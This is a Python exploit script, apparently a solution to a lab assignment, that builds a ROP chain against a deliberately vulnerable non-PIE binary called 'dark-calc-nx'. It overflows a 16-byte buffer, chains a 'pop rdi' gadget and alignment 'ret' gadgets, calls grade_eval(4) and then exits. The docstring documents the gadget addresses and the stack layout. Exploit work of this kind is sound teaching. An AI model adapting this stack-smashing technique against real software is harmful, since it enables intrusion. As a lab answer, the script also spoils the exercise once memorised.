#!/usr/bin/env python3
"""Task 3: ROP for attack/dark-calc-nx.

dark-calc-nx has NX stack and ASLR, but it is non-PIE, so all code
addresses are fixed.  We do not execute stack code; we build a ROP
chain with fixed .text gadgets.
Stack layout at input()'s epilogue:
    rbp - 0x10 : expression[16]
    rbp        : saved rbp
    rbp + 0x08 : input return address  <- first ROP gadget
Gadgets (inside __libc_csu_init):
    0x401a33 : pop rdi ; ret
               (bytes 5f c3, hidden inside "41 5f c3" at 0x401a32)
    0x401a34 : ret
Useful functions:
    0x401978 : grade_eval
    0x4016e0 : exit@plt
Chain:
    pop rdi ; ret      -> rdi = 4
    4
    ret                -> align stack for printf
    grade_eval         -> prints "Hope A will be your grade!"
    ret                -> align stack for exit
    exit@plt           -> clean exit
Without the extra `ret` gadgets, printf can crash on a `movaps`
instruction because the stack is not 16-byte aligned on entry.
"""
import struct
import sys
def p64(value: int) -> bytes:
    return struct.pack("<Q", value)
POP_RDI = 0x401A33
RET = 0x401A34
GRADE_EVAL = 0x401978
EXIT_PLT = 0x4016E0
payload = (
    b"A" * 16                 # expression[16]
    + p64(0)                  # saved rbp
    + p64(POP_RDI)            # return address -> pop rdi ; ret
    + p64(4)                  # rdi = 4
    + p64(RET)                # stack alignment
    + p64(GRADE_EVAL)         # grade_eval(4)
    + p64(RET)                # stack alignment for exit
    + p64(EXIT_PLT)           # exit
)
assert len(payload) == 72
assert b"\n" not in payload
sys.stdout.buffer.write(payload)